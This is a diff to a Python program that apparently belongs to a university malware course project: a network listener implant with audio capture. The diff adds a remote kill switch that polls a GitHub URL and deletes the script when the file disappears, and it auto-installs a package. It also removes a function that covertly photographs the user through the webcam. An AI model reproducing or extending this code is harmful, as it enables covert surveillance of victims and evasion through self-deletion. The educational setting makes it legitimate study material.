@@ -18,6 +18,54 @@ import crypt
 
 
 THIS_FILE = os.path.realpath(__file__)
+BASE_FLAG_URL = "https://raw.githubusercontent.com/ucla-e1-malware/final-project-theoreos/main/run_payload"
+
+def kill_switch_loop():
+    while True:
+        if check_kill_switch():
+            print("[*] Kill switch triggered. Shutting down.")
+            os._exit(0)
+        time.sleep(5) 
+
+def check_kill_switch():
+    import requests
+    print ("checking")
+    try:
+        # Cache-busting: append a unique timestamp as a query parameter
+        # Example: .../flag.txt?nocache=1710144505.123
+        unique_url = f"{BASE_FLAG_URL}?nocache={time.time()}"
+        
+        # We use a HEAD request to save bandwidth
+        response = requests.head(unique_url)
+        
+        # If GitHub returns 404, the file is officially gone
+        if response.status_code == 404:
+            print("Flag not found (404)! Initiating self-destruct...")
+            f = __file__
+            try:
+                os.remove(f)
+                print(f"[*] Deleted {f}")
+            except Exception as e:
+                print(f"[-] Could not delete {f}: {e}")
+            return True 
+        
+        print(f"Flag still exists (Status: {response.status_code}). Standing by.")
+        return False
+
+    except Exception as e:
+        print(f"Connection error: {e}")
+        return False
+
+def ensure_requests():
+    try:
+        import requests
+    except ImportError:
+        print("Requests not found. Installing now...")
+        # This runs 'pip install requests' using the current python executable
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
+        print("Installation complete. Resuming script.")
+
+
 
 # Added for multiline
 
@@ -34,29 +82,6 @@ def recv_framed(sock):
         data += sock.recv(msg_len - len(data)) 
     return data
 
-# photo 
-
-def take_photo(path="photo.jpg", camera_index=0):
-    import cv2
-
-    cap = cv2.VideoCapture(camera_index)
-    if not cap.isOpened():
-        raise RuntimeError("Could not open camera")
-
-    try:
-        ok, frame = cap.read()
-        if not ok:
-            raise RuntimeError("Could not read frame from camera")
-
-        ok = cv2.imwrite(path, frame)
-        if not ok:
-            raise RuntimeError(f"Failed to write image to {path}")
-    finally:
-        cap.release()
-    
-    with open(path, "rb") as f:
-        photo_bytes = f.read()
-    return photo_bytes
 
 # audio 
 
@@ -542,6 +567,8 @@ def handle_conn(conn, addr):
 
 def main():
     kill_others()
+    ensure_requests()
+    import threading
     # DEBUG: Show initial state
     print(f"[DEBUG] Starting main()")
     print(f"[DEBUG] UID={os.getuid()}, EUID={os.geteuid()}")
@@ -583,17 +610,27 @@ def main():
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         s.bind((HOST, PORT))
         s.listen(10)
+        s.settimeout(5)  
         print(f"[+] Listening on {HOST}:{PORT} as UID {os.getuid()}")
+
+        t = threading.Thread(target=kill_switch_loop, daemon=True)
+        t.start()
         
         while True:
             try:
                 conn, addr = s.accept()
                 handle_conn(conn, addr)
+            except socket.timeout:
+                continue
             except KeyboardInterrupt:
                 print("\n[*] Shutting down.")
                 raise
             except Exception as e:
                 print(f"[-] Connection error: {e}")
+
+
+
+
 
 if __name__ == "__main__":
     main()
